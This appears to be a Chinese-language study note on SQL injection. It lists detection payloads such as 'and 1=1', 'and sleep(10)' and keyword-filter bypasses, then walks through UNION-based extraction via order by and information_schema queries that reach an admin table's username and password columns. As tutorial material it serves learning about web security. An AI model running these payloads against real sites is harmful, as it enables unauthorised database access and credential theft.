#   SQL注入

本质：将用户输入的信息当作sql代码进行代码执行
注入的本质：

xss：用户输入的信息当作前端代码执行

xxe：用户输入的信息当作xml代码执行

命令执行：用户输入信息当作系统命令执行

满足条件

* 用户可以控制输入
* 原本程序的代码拼接了用户的输入再次进行执行

owasp top 10:每年的漏洞排名

随着get传参的不同，页面的内容也会跟着改变

SQL注入：

* 检测漏洞是否存在
* 利用漏洞

可以利用：select*from news where id = 2-1 如果页面显示为1那么这个网站就存在sql注入漏洞

1,通过运算检测sql漏洞的方法

​	and 1=1 , and 1=2（99%会被拦截）

​	and -1=-1

​	通过&&符号绕过and

​	通过like或or绕过=

​	&& 1 like 1

​	&& -1 like -1

​	&& 1 or 1

​	传参强转

2,通过sleep函数检测

​	and sleep(10)

​	若果网页图标旋转载入不了，时间较长说明此网站有sql注入漏洞

### 利用漏洞拿信息

* union => 联合输出：将两条sql语句的结果一起输出 （满足条件：相同字段）
  * ?id=9.999999 union select 1,2
  * 数据库会输出2
  * 数据库会选择性输出
  * union select 1,database()
  * 数据库就会输出当前数据库的名称
  * <img src="/Users/yan/Desktop/截屏2021-07-25 下午1.43.11.png" alt="截屏2021-07-25 下午1.43.11" style="zoom:50%;" />
* order by =>查看有几个字段
  * order by 1
  * order by 2
  * order by 3（到3时不正常了就说明只有两个字段）
  * ID都是正整数类型（int）
  * 数据库可以选择性输出
* information_schema=>information_schema这个数据库中存放着数据库和数据表的关联
  * Table_name from information_schema.tables where table_schame=database()
  * 输出所在数据库maoshe中的表名
  * information_schema.columns 
    * 数据库中的表中的字段的名称
    * union select1.column_name from information_schema.columns where table_name='admin'and table_schema=database() limit 1,1
    * 查询字段名称
    * limit 1,1
    * limit 2,1
    * limit 3,1
    * <img src="/Users/yan/Desktop/截屏2021-07-25 下午9.08.52.png" alt="截屏2021-07-25 下午9.08.52" style="zoom:50%;" />
    * 通过语句查询到了三个字段
    * id username password

* limit=>分页
  * limit n,n 从n+1开始取m条数据
  * limit 0,10 从1开始取，取10条数据
* Database=>显示当前数据库的库名=>mash







# 总结

1，检查网页是否存在漏洞

2，利用漏洞

* order by（知道字段数）union 
* information_schema 查询库表字段